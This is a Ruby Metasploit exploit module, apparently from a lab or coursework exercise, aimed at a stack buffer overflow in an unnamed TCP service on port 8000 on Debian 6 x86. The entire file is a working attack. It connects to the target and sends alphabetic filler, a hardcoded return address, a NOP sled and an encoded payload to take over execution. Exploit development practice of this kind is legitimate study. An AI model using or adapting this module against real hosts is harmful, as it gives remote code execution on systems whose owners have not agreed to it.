##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking
	#makes tcp functions available
	include Msf::Exploit::Remote::Tcp
  def initialize(info={})
    super(update_info(info,
      'Name'           => "Lukes program",
      'Description'    => %q{
        buffer overflow exploit
      },
      'License'        => MSF_LICENSE,
      'Author'         => [ 'Luke Freeman' ],
      'References'     =>
        [
          [ 'URL', '' ]
        ],
      'Platform'       => 'linux',
      'Targets'        => 
        [
          [ 'Debian 6 x86',
            {
              'Ret' => 0xbffff50c # This will be available in `target.ret`
            }
          ]
        ],
      'Payload'        =>
        {
		  'space' => "765",
          'BadChars' => "\x00\x0a\x0d"
        },
      'Privileged'     => false,
      'DisclosureDate' => "",
      'DefaultTarget'  => 0))

	  register_options(
	 	[
			Opt::RPORT(8000)
		], self.class)
	
  end

  #def check
    # For the check command
  #end

  def exploit
    print_status('Connecting')
	connect
	sock.get_once
	#construct the buffer
	buf = rand_text_alpha(223)
	buf << [target['Ret']].pack('V') #32 bit little endian
	buf << make_nops(32)
	buf << payload.encoded
	buf << make_nops(1024-buf.length)
	print_status('Sending exploit...')
	sock.put(buf)
	print_status('Disconnecting...')
	disconnect
  end

end
